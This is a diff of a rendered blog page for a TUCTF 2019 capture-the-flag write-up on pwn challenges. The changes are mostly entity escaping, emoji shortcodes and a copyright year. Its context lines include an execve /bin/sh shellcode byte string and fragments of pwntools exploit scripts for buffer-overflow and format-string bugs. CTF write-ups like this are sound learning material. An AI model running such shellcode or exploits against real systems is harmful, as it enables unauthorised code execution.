@@ -28,7 +28,7 @@
   
     
   
-  <meta name="description" content="I couldn&#39;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.
+  <meta name="description" content="I couldn&rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.
  Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow.">
 
   
@@ -152,7 +152,7 @@
   <meta property="og:site_name" content="Shreyansh Singh">
   <meta property="og:url" content="/post/2019-12-02_tuctf-pwn-2019/">
   <meta property="og:title" content="TUCTF 2019 - Pwn &amp; Rev Challenges | Shreyansh Singh">
-  <meta property="og:description" content="I couldn&#39;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.
+  <meta property="og:description" content="I couldn&rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.
  Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow."><meta property="og:image" content="/post/2019-12-02_tuctf-pwn-2019/featured.png">
   <meta property="twitter:image" content="/post/2019-12-02_tuctf-pwn-2019/featured.png"><meta property="og:locale" content="en-us">
   
@@ -209,7 +209,7 @@
       "url": "/img/shreyansh-icon-512.png"
     }
   },
-  "description": "I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.\n Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow."
+  "description": "I couldn\u0026rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.\n Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow."
 }
 </script>
 
@@ -238,6 +238,8 @@
     }
 
 </style>
+
+
 
 
   <title>TUCTF 2019 - Pwn &amp; Rev Challenges | Shreyansh Singh</title>
@@ -570,7 +572,7 @@
   <div class="article-container">
 
     <div class="article-style">
-      <p>I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.</p>
+      <p>I couldn&rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.</p>
 <hr>
 <h1 id="pwn-challenges">Pwn Challenges</h1>
 <h2 id="thefirst---379-pts">thefirst - 379 pts</h2>
@@ -698,7 +700,7 @@ p<span style="color:#f92672">.</span>interactive()
 
 </figure>
 
-<p>We use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shell-storm</a> to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &lsquo;A's and then provide the address to write to, i.e. the adress provided to us.</p>
+<p>We use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shell-storm</a> to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &lsquo;A&rsquo;s and then provide the address to write to, i.e. the adress provided to us.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xc0</span><span style="color:#ae81ff">\x50</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x73</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x62</span><span style="color:#ae81ff">\x69</span><span style="color:#ae81ff">\x6e</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xe3</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xc1</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xc2</span><span style="color:#ae81ff">\xb0</span><span style="color:#ae81ff">\x0b</span><span style="color:#ae81ff">\xcd</span><span style="color:#ae81ff">\x80</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xc0</span><span style="color:#ae81ff">\x40</span><span style="color:#ae81ff">\xcd</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#34;</span>
 len_shell_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
 
@@ -812,9 +814,9 @@ p<span style="color:#f92672">.</span>interactive()
 
 </figure>
 
-<p>This is intereting as both these addresses are also present in the program's output with our input.</p>
+<p>This is intereting as both these addresses are also present in the program&rsquo;s output with our input.</p>
 <p>So, all we have to do is overwrite the 6th and 7th &ldquo;addresses&rdquo; of the output to the same value so that the string comparison passes.</p>
-<p>We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now ☹) -</p>
+<p>We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">printfun</span><span style="color:#e6db74">&#34;</span>)
@@ -990,7 +992,7 @@ flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><sp
 <span style="color:#66d9ef">print</span>(flag)
 </code></pre></div><p>The flag - <code>TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}</code></p>
 <hr>
-<p>That's all for now 👋.</p>
+<p>That&rsquo;s all for now :wave:.</p>
 
     </div>
 
@@ -1430,7 +1432,7 @@ flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><sp
   
 
   <p class="powered-by">
-    © Shreyansh Singh 2019 &middot; 
+    © Shreyansh Singh 2020 &middot; 
 
     Powered by 
     
